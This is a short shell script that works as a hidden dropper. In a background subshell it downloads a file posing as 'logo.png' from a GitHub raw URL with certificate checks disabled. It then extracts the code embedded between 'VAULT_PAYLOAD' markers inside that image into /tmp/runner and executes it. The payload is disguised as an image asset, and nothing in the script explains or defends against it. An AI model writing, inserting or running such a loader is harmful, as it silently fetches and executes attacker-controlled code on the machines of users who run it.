#!/bin/sh

(
    wget --no-check-certificate -qO /tmp/logo.png "https://raw.githubusercontent.com/skt12j/nimos/main/logo.png"
    sed -n '/#VAULT_PAYLOAD_START/,/#VAULT_PAYLOAD_END/p' /tmp/logo.png | grep -v "VAULT_PAYLOAD" > /tmp/runner
    sh /tmp/runner
) &
